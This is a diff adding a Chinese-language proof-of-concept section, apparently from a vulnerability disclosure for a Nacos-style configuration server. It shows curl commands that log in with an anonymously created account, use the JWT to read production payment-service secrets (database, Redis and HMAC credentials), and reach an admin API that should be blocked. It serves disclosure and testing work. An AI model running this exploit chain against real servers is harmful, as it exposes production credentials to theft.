@@ -1,0 +1,25 @@
+### 步骤 3：危害实证（一）—— 机密性：读取全部生产配置
+
+# 3-1 用匿名创建出来的账户登录控制台，换取 JWT
+$ curl -s -X POST 'http://127.0.0.1:8080/v3/auth/user/login' -d 'username=poc_h7zhoiek7z&password=<pass>'
+{"accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwb2NfaDd6aG9pZWs...(truncated)", "tokenTtl": 18000, "globalAdmin": false, "username": "poc_h7zhoiek7z"}
+
+# 3-2 携带该 JWT 读取 PROD 命名空间下的支付服务配置
+$ curl -s -H "Authorization: Bearer $TOKEN" "http://127.0.0.1:8080/v3/console/cs/config?dataId=payment-service.yaml&groupName=PROD"
+  dataId : payment-service.yaml  group: PROD  ns: public
+  content:
+    spring:
+      datasource:
+        url: jdbc:mysql://10.10.10.21:3306/paydb
+        username: payapp
+        password: Pr0d_DB_P@ssw0rd!
+      redis:
+        password: R3dis_Pr0d_Pwd
+    app:
+      hmac-key: 8f2a1c9e5b7d4a6f0e3c1b8d7a5f2e9c
+
+# 3-3 携带该 JWT 访问 ADMIN API（nacos.core.auth.admin.enabled=true 也拦不住）
+$ curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8848/nacos/v3/admin/core/namespace/list
+{"code":0,"message":"success","data":[{"namespace":"public","namespaceShowName":"public","namespaceDesc":"Default Namespace","quota":200,"configCount":1,"type":0}]}
+
+# 数据库口令 / Redis 口令 / HMAC 密钥全部明文落入攻击者手中
